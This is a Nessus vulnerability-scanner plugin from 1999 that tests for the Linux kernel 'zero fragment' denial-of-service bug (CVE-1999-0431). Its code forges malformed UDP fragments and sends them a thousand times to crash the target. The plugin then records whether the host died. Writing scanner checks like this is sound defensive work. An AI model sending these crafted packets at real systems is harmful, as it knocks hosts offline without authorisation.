#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10134);
 script_bugtraq_id(2247);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-0431");
 script_xref(name:"OSVDB", value:"5941");
 name["english"] = "Linux 2.1.89 - 2.2.3 : 0 length fragment bug";
 name["francais"] = "Linux 2.1.89 - 2.2.3 : 0 length fragment bug";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the
remote server using the linux 'zero fragment' bug.

An attacker may use this flaw to prevent your
network from working properly.

Solution : if the remote host is a Linux server, then install
a newer kernel (2.2.4). If it is not, then contact your vendor
for a patch.

Risk factor : High";

 desc["francais"] = "Il s'est avéré possible de tuer
le serveur distant en utilisant le bug de Linux
appelé 'zero fragment'.

Un pirate peut utiliser ce problème pour
empecher votre réseau de fonctionner 
correctement.

Solution : si la machine distante est un serveur
Linux, installez un kernel plus récent (2.2.4)
Sinon, contactez votre vendeur pour un patch.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote linux box";
 summary["francais"] = "Tue le serveur linux distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 
 exit(0);
}

#
# The script code starts here
#


include('global_settings.inc');

if ( ! thorough_tests ) exit(0);

start_denial();

# source port
s = 56;
# dest port
d = 16384;

ip = forge_ip_packet(ip_v : 4,
                     ip_hl: 5,
                     ip_tos:0,
                     ip_id : 0x1234,
                     ip_ttl: 0x40,
                     ip_p  : IPPROTO_UDP,
                     ip_len:  20 + 32,
		     ip_src: this_host(),
                     ip_off: IP_MF);
udp1 = forge_udp_packet(ip:ip, uh_sport:s, uh_dport:d, uh_ulen:56);

ip = set_ip_elements(ip : ip, ip_len : 20, ip_off : IP_MF);
udp2 = forge_udp_packet(ip:ip, uh_sport:s,uh_dport:d, uh_ulen:56,
                        update_ip_len:FALSE);
ip = set_ip_elements(ip : ip, ip_len:32 + 20,ip_off:4);
udp3 = forge_udp_packet(ip:ip, uh_sport:s,uh_dport:d,uh_ulen:56);

# don't read the host answers
send_packet(udp1,udp2, udp3, pcap_active:FALSE) x 1000;

sleep(30);

alive = end_denial();

if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(port:0, protocol:"udp");
                }
